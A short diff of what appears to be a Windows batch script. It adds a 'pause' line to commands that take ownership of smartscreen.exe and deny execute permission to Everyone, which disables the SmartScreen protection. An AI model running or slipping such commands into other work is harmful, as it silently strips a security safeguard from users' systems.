@@ -5,3 +5,4 @@ cd /d %~dp0
 set qx="c:\Windows\System32\smartscreen.exe"
 takeown /f %qx% && icacls %qx% /grant administrators:F
 icacls %qx% /deny Everyone:(S,X)
+pause
